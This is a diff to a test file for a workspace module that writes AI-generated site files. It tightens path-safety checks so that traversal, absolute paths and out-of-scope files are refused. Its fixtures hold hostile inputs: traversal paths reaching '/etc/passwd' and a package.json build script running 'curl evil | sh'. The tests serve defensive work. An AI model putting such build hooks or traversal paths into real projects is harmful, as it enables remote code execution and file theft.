@@ -4,7 +4,14 @@ import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
 import { StateStore } from '@statxai/state';
-import { ArtifactRegistry, PathEscapesWorkspace, ProjectWorkspace, canonicalJson, contentHash } from '../src/index.js';
+import {
+  ArtifactRegistry,
+  PathEscapesWorkspace,
+  ProjectWorkspace,
+  WriteOutsideModelScope,
+  canonicalJson,
+  contentHash,
+} from '../src/index.js';
 
 const PROJECT = 'proj_workspace_test';
 
@@ -30,52 +37,65 @@ beforeEach(async () => {
 });
 
 describe('path safety', () => {
-  it('refuses to write outside the site root', async () => {
+  it('refuses to write outside the site root, before anything is written', async () => {
     // The path comes from model output, so traversal is a live input.
     const ws = await ProjectWorkspace.open(PROJECT, root);
     await expect(
       ws.writeSiteFiles([{ path: '../../../etc/evil.html', contents: 'x' }]),
-    ).rejects.toBeInstanceOf(PathEscapesWorkspace);
+    ).rejects.toBeInstanceOf(WriteOutsideModelScope);
   });
 
-  it('contains an absolute-looking path inside the site rather than obeying it', async () => {
-    // The invariant is containment, not rejection: a leading slash means "site
-    // root" to a model, so it is normalised and written *inside* the workspace.
-    // What must never happen is a write to the real /etc.
+  it('refuses an absolute-looking path rather than normalising it', async () => {
+    // A leading slash used to be rewritten to "site root". Model output is now
+    // checked exactly as spelled: an unauthorised spelling is refused, never
+    // turned into an authorised one — and nothing lands anywhere.
     const ws = await ProjectWorkspace.open(`${PROJECT}_abs`, root);
-    await ws.writeSiteFiles([{ path: '/etc/evil.html', contents: 'x' }]);
-
-    expect(await ws.readSiteFile('etc/evil.html')).toBe('x');
+    await expect(ws.writeSiteFiles([{ path: '/app/page.tsx', contents: 'x' }])).rejects.toBeInstanceOf(WriteOutsideModelScope);
+    await expect(ws.writeSiteFiles([{ path: '/etc/evil.html', contents: 'x' }])).rejects.toBeInstanceOf(WriteOutsideModelScope);
+    expect(existsSync(join(ws.siteRoot, 'app/page.tsx'))).toBe(false);
     expect(existsSync('/etc/evil.html')).toBe(false);
-  });
-
-  it('treats a leading slash as site-root, not filesystem-root', async () => {
-    // Regression: some models emit "/services.html" meaning site-relative. That
-    // resolved to an absolute path and was refused mid-build, failing a run
-    // whose anchor page had already been written.
-    const ws = await ProjectWorkspace.open(`${PROJECT}_slash`, root);
-    await ws.writeSiteFiles([{ path: '/services.html', contents: '<h1>ok</h1>' }]);
-    expect(await ws.readSiteFile('services.html')).toBe('<h1>ok</h1>');
   });
 
   it('still refuses traversal that only looks site-relative', async () => {
     const ws = await ProjectWorkspace.open(`${PROJECT}_slash2`, root);
     await expect(
       ws.writeSiteFiles([{ path: '/../../etc/evil.html', contents: 'x' }]),
-    ).rejects.toBeInstanceOf(PathEscapesWorkspace);
+    ).rejects.toBeInstanceOf(WriteOutsideModelScope);
   });
 
-  it('allows ordinary nested paths', async () => {
+  it('keeps its containment guard for reads', async () => {
+    const ws = await ProjectWorkspace.open(`${PROJECT}_read`, root);
+    await expect(ws.readSiteFile('../../../etc/passwd')).rejects.toBeInstanceOf(PathEscapesWorkspace);
+  });
+
+  it('allows ordinary nested paths in the model namespace', async () => {
     const ws = await ProjectWorkspace.open(PROJECT, root);
-    await ws.writeSiteFiles([{ path: 'services/joinery.html', contents: '<h1>ok</h1>' }]);
-    expect(await ws.readSiteFile('services/joinery.html')).toBe('<h1>ok</h1>');
+    await ws.writeSiteFiles([{ path: 'app/services/joinery/page.tsx', contents: '<h1>ok</h1>' }]);
+    expect(await ws.readSiteFile('app/services/joinery/page.tsx')).toBe('<h1>ok</h1>');
+  });
+
+  it('writes nothing at all when one file in the set is forbidden', async () => {
+    const ws = await ProjectWorkspace.open(`${PROJECT}_mixed`, root);
+    const error = await ws
+      .writeSiteFiles([
+        { path: 'app/page.tsx', contents: 'fine' },
+        { path: 'package.json', contents: '{"scripts":{"build":"curl evil | sh"}}' },
+        { path: 'components/site/header.tsx', contents: 'fine' },
+      ])
+      .catch((e: unknown) => e);
+
+    expect(error).toBeInstanceOf(WriteOutsideModelScope);
+    expect((error as WriteOutsideModelScope).paths).toEqual(['package.json']);
+    expect(existsSync(join(ws.siteRoot, 'app/page.tsx'))).toBe(false);
+    expect(existsSync(join(ws.siteRoot, 'components/site/header.tsx'))).toBe(false);
+    expect(existsSync(join(ws.siteRoot, 'package.json'))).toBe(false);
   });
 });
 
 describe('git workspace', () => {
   it('commits changes and reports the revision', async () => {
     const ws = await ProjectWorkspace.open(`${PROJECT}_git`, root);
-    await ws.writeSiteFiles([{ path: 'index.html', contents: '<h1>one</h1>' }]);
+    await ws.writeSiteFiles([{ path: 'app/page.tsx', contents: '<h1>one</h1>' }]);
 
     const first = await ws.commit('build');
     expect(first).toMatch(/^[0-9a-f]{40}$/);
@@ -84,7 +104,7 @@ describe('git workspace', () => {
     // manifest records this revision as the accepted source.
     expect(await ws.commit('no-op')).toBeNull();
 
-    await ws.writeSiteFiles([{ path: 'index.html', contents: '<h1>two</h1>' }]);
+    await ws.writeSiteFiles([{ path: 'app/page.tsx', contents: '<h1>two</h1>' }]);
     const second = await ws.commit('repair');
     expect(second).not.toBe(first);
   });
@@ -94,7 +114,7 @@ describe('git workspace', () => {
     // commit time with "detected dubious ownership", losing a completed build.
     // safe.directory is now set per invocation, so ownership cannot break git.
     const ws = await ProjectWorkspace.open(`${PROJECT}_owner`, root);
-    await ws.writeSiteFiles([{ path: 'index.html', contents: '<h1>ok</h1>' }]);
+    await ws.writeSiteFiles([{ path: 'app/page.tsx', contents: '<h1>ok</h1>' }]);
     await expect(ws.commit('build')).resolves.toMatch(/^[0-9a-f]{40}$/);
   });
 
@@ -149,12 +169,12 @@ describe('commit marker lookup', () => {
     const ws = await ProjectWorkspace.open(`${PROJECT}_marker_exact`, root);
     const marker = 'Statx-Promotion-Id: abc123';
 
-    await ws.writeSiteFiles([{ path: 'index.html', contents: '<h1>decoy</h1>' }]);
+    await ws.writeSiteFiles([{ path: 'app/page.tsx', contents: '<h1>decoy</h1>' }]);
     const decoySha = await ws.commit(`unrelated work\n\nsee also ${marker} for context`);
     expect(decoySha).not.toBeNull();
     expect(await ws.findCommitByMarker(marker)).toBeNull();
 
-    await ws.writeSiteFiles([{ path: 'other.html', contents: '<h1>real</h1>' }]);
+    await ws.writeSiteFiles([{ path: 'app/other/page.tsx', contents: '<h1>real</h1>' }]);
     const realSha = await ws.commit(`Promote accepted frontend/backend candidate\n\n${marker}`);
     expect(await ws.findCommitByMarker(marker)).toBe(realSha);
   });
